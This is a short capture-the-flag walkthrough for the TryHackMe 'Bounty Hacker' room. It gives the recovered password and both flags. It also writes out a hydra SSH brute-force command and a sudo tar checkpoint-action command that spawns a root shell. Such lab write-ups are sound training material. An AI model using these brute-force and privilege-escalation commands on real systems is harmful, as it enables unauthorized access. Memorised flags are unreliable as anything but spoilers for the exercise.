Room: Bounty Hacker
Link: https://tryhackme.com/room/cowboyhacker

Machine IP: 10.10.187.209

### Scanning
Nmap scan results:
   21/tcp    open   ftp (Anonymous login allowed)
   22/tcp    open   ssh   
   80/tcp    open   http

FTP:
  From ftp login we find 2 txt files.
  tast.txt states these following tasks:
     1.) Protect Vicious.
     2.) Plan for Red Eye pickup on the moon.

     -lin
 
 Locks.txt contains a list a passwords and as we can see we have a username lin, so we can do a bruteforce attack.
     hydra -l lin -P locks.txt ssh://machine ip
 Within a few seconds we get the password: RedDr4gonSynd1cat3
 
 Now logging in to the machine via ssh, well we find the user flag easily in Desktop directory.
     User flag: THM{CR1M3_SyNd1C4T3}

### PrivEsc
 Running the sudo -l command we see user lin can run tar as root. So searching gtfo bins we find 
     sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 If while running the above command you get an error try sudo 
 /bin/tar. 
And we get our privileged shell.
 Now moving to the root directory we find our root 
 flag: THM{80UN7Y_h4cK3r}
